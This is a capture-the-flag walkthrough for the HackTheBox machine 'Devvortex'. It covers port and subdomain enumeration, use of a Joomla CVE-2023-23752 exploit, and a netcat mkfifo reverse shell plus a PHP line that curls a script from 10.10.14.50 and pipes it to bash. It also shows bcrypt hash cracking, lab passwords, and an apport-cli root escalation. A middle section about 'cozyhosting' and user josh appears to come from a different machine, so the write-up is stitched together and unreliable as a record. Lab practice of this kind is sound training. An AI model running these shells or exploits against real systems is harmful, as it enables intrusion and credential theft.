---
title: "Devvortex"
date: 2024-09-02
categories: HTB
tags: ["htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "devvortex", "penetration testing", "writeup", "htb"]
---

# Devvortex

# Devvortex

# Enumeration
## Nmap
# TCP
```sh
Nmap scan report for 10.10.11.242
Host is up, received user-set (0.020s latency).
Scanned at 2024-07-01 08:35:10 AEST for 16s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80-HTTP
# Screenshots
![[/assets/images/devvortex1.png]]
![[/assets/images/devvortex2.png]]

# Gobuster
```sh
└─$ gobuster dir -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o gobusteroutput
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/.                    (Status: 200) [Size: 18048]
Progress: 56293 / 56294 (100.00%)
===============================================================
Finished
===============================================================
```

# FFuF
```sh
# subdomain
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host:FUZZ.devvortex.htb' -fw 4 -t 100
```
![[/assets/images/devvortex5.png]]

> Found `dev.devvortex.htb` upon reverting the machine......
> -> add to `/etc/hosts`


raft-medium-files
![[/assets/images/devvortex3.png]]
directory-list-2.3-big
![[/assets/images/devvortex4.png]]
# dev.devvortex.htb
http://dev.devvortex.htb/
![[/assets/images/devvortex6.png]]

Running gobuster on dev.devvortex.htb found the following URLs:
![[/assets/images/devvortex7.png]]http://dev.devvortex.htb/layouts/

http://dev.devvortex.htb/administrator/
![[/assets/images/devvortex8.png]]
`admin:admin` doesn't work. 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
# Joomla Enumeration
![[/assets/images/devvortex9.png]]
https://github.com/SamJoan/droopescan

![[/assets/images/devvortex10.png]]
![[/assets/images/devvortex11.png]]


# UDP
```sh
PORT      STATE         SERVICE      VERSION
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
```


## Summary
# Linpeas
- codename : jammy
- 


![[Pasted image 20240630094735.png]]
![[Pasted image 20240630094933.png]]![[Pasted image 20240630095024.png]]
![[Pasted image 20240630095115.png]]
![[Pasted image 20240630095145.png]]
![[Pasted image 20240630095229.png]]
![[Pasted image 20240630095256.png]]
# Lateral Movement
```sh
unzip -d /tmp/app cloudhosting-0.0.1 jar
```

![[Pasted image 20240630095630.png]]

```text
spring.datasource.password = Vg&nvzAQ7XxR
```
## Postgres
```sh
# on the target
psql -h 127.0.0.1 -U postgres
\list
q # to exit result view
\connect cozyhosting
\dt
select * from users;
```

![[Pasted image 20240630102334.png]]
![[Pasted image 20240630102404.png]]
```test
kanderson: $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin : $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

![[Pasted image 20240630102713.png]]

Considering that these hashes stem from a Spring Boot web application, the most likelycandidate is bcrypt . We save the administrator's hash to a file and attempt to crack it using Hashcat , with mode 3200 for bcrypt.

```sh
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force
```

![[Pasted image 20240630103212.png]]

```text
manchesterunited
```

# josh
ssh as josh using the password obtained.
![[Pasted image 20240630103320.png]]

![[Pasted image 20240630103412.png]]
## GTFOBins
![[Pasted image 20240630103749.png]]
![[Pasted image 20240630103819.png]]

# Initial Access
https://www.exploit-db.com/exploits/51334

https://github.com/Acceis/exploit-CVE-2023-23752
```sh
sudo gem install httpx docopt paint
ruby exploit.rb http://dev.devvortex.htb
```

![[/assets/images/devvortex12.png]]

```text
lewis : P4ntherg0t1n5r3c0n##
```

![[/assets/images/devvortex13.png]]

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
![[/assets/images/devvortex14.png]]

```sh
# reverse shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.50 9001 >/tmp/f" > rev.sh
```

```php
# RFI to download reverse shell
<?php system ("curl 10.10.14.50:80/rev.sh|bash"); ?>
```

![[/assets/images/devvortex17.png]]

```sh
# Execute the reverse shell
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

shell as www-data
![[/assets/images/devvortex18.png]]

# Lateral Movement
![[/assets/images/devvortex19.png]]
![[/assets/images/devvortex20.png]]

```text
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

`$2y*$` -> brcypt

```sh
hashcat -m 3200 logan /usr/share/wordlists/rockyou.txt --force
```

![[/assets/images/devvortex22.png]]

```sh
su logan 
tequieromuch
```

# Privilege Escalation
# Linpeas
![[/assets/images/devvortex23.png]]
![[/assets/images/devvortex24.png]]

![[/assets/images/devvortex25.png]]

![[/assets/images/devvortex26.png]]
https://github.com/diego-tella/CVE-2023-1326-PoC

```sh
sleep 20 &
kill -ABRT 7650
ls /var/crash/
sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
v
!/bin/bash
```

![[/assets/images/devvortex27.png]]

![[/assets/images/devvortex28.png]]
